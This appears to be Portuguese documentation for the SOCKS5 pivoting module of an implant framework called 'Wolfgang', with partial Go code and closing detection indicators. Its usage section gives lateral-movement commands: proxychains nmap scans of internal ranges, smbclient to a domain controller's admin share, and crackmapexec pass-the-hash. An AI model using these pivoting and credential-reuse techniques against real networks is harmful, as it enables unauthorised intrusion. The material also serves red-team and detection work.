    SOCKS Proxy¶

    O que é¶

    O módulo SOCKS5 transforma o implant em um proxy que permite ao operador rotear tráfego arbitrário para qualquer destino acessível pelo agente. Diferente do port forwarding (que mapeia uma porta para um destino fixo), o SOCKS proxy permite roteamento dinâmico -- o destino é especificado pelo cliente a cada conexão.

    O operador configura suas ferramentas (proxychains, browser, nmap) para usar o proxy SOCKS5, e todo o tráfego é transparentemente roteado através do implant.

    Por que funciona¶

    SOCKS5 (RFC 1928) é um protocolo de proxy genérico que opera na camada de transporte. O cliente se conecta ao proxy, negocia autenticação, e envia um request com o endereço e porta de destino. O proxy estabelece a conexão e relay os dados bidirecionalmente.

    O protocolo suporta:

    • TCP Connect: Conexões TCP para qualquer destino (o mais usado)
    • UDP Associate: Relay de pacotes UDP (DNS, etc.)
    • Domain resolution: O proxy pode resolver DNS, evitando DNS leaks no lado do operador
    • Authentication: Username/password (RFC 1929)

    Na prática, o implant age como um gateway de rede: qualquer ferramenta do operador que suporte SOCKS5 pode alcançar hosts internos como se estivesse na rede do alvo.

    Implementação no Wolfgang¶

    O módulo lateral.socks (pkg/module/lateral/socks.go) implementa um servidor SOCKS5 completo com suporte a autenticação, UDP associate, upstream proxy chaining, e connection tracking.

    Estrutura principal¶

    Handshake SOCKS5¶

    Cada conexão passa por 4 fases:

    func (m *SocksModule) handleConn(state *socksState, clientConn net.Conn) {
    // Fase 1: Negociar método de autenticação
    method, _ := negotiateAuth(clientConn, m.username, m.password)
    clientConn.Write([]byte{socks5Version, method})

    // Fase 2: Validar credenciais (se aplicável)
    if method == socks5AuthUserPass {
        ok, _ := validateUsernamePassword(clientConn, m.username, m.password)
        // ...
    }

    // Fase 3: Parsear request (destino + porta)
    cmd, addr, port, _ := parseSOCKS5Request(clientConn)

    // Fase 4: Conectar e relay
    target := net.JoinHostPort(addr, strconv.Itoa(int(port)))
    // ...
}

    Autenticação¶

    A autenticação usa crypto/subtle.ConstantTimeCompare para prevenir timing attacks:

    func validateUsernamePassword(r io.Reader, expectedUser, expectedPass string) (bool, error) {
    // ... parse username e password do stream ...
    userOK := subtle.ConstantTimeCompare(uname, []byte(expectedUser)) == 1
    passOK := subtle.ConstantTimeCompare(passwd, []byte(expectedPass)) == 1
    return userOK && passOK, nil
}

    Upstream Proxy Chaining¶

    Para cenários multi-hop, o módulo pode conectar a um proxy SOCKS5 upstream em vez de conectar diretamente ao destino:

    if m.upstreamProxy != "" {
    proxyConn, _ := net.DialTimeout("tcp", m.upstreamProxy, socksDialTimeout)
    socks5Connect(proxyConn, target, m.upstreamUser, m.upstreamPass)
    targetConn = proxyConn
} else {
    targetConn, _ = net.DialTimeout("tcp", target, socksDialTimeout)
}

    Isso permite construir cadeias de pivots: operador → SOCKS1 → SOCKS2 → alvo.

    Connection Tracking¶

    O connTracker rastreia todas as conexões ativas para visibilidade operacional:

    type connInfo struct {
    ID        string    `json:"id"`
    Source    string    `json:"source"`
    Target    string    `json:"target"`
    StartTime time.Time `json:"start_time"`
}

    O operador pode listar conexões ativas com a ação list_connections.

    Ações do módulo¶

    start Inicia proxy SOCKS5 listen_port, listen_addr, username, password, upstream_proxy
    stop Para um proxy id ou listen_port
    list Lista proxies ativos -

    Uso Operacional¶

    proxychains¶

    # /etc/proxychains.conf
socks5 127.0.0.1 1080 username password

# Uso
proxychains nmap -sT -Pn 10.0.1.0/24
proxychains smbclient //dc01/C$ -U admin
proxychains ssh user@10.0.1.50

    Firefox / Browser¶

    Configurar manualmente em Settings > Network > Proxy:

    • SOCKS Host: 127.0.0.1
    • Port: 1080
    • SOCKS v5
    • Proxy DNS: habilitado (evita DNS leaks)

    Impacket / CrackMapExec¶

    export ALL_PROXY=socks5://user:pass@127.0.0.1:1080
crackmapexec smb 10.0.1.0/24 -u admin -H <ntlm_hash>

    Detecção¶

    IOC Descrição
    Processo com listener TCP e múltiplas conexões outbound Padrão de proxy
    Tráfego SOCKS5 (byte 0x05 no início da conexão) Protocolo identificável
    Conexões para muitos destinos distintos a partir de um host Fan-out pattern
    DNS queries do host do implant (e não do operador) DNS resolution via proxy

    Mitigações:

    • Network segmentation: Limitar quais hosts podem conectar a quais destinos
    • Protocol inspection: Deep packet inspection pode identificar SOCKS5
    • Baseline de conexões: Alertar sobre hosts com padrão de fan-out anormal
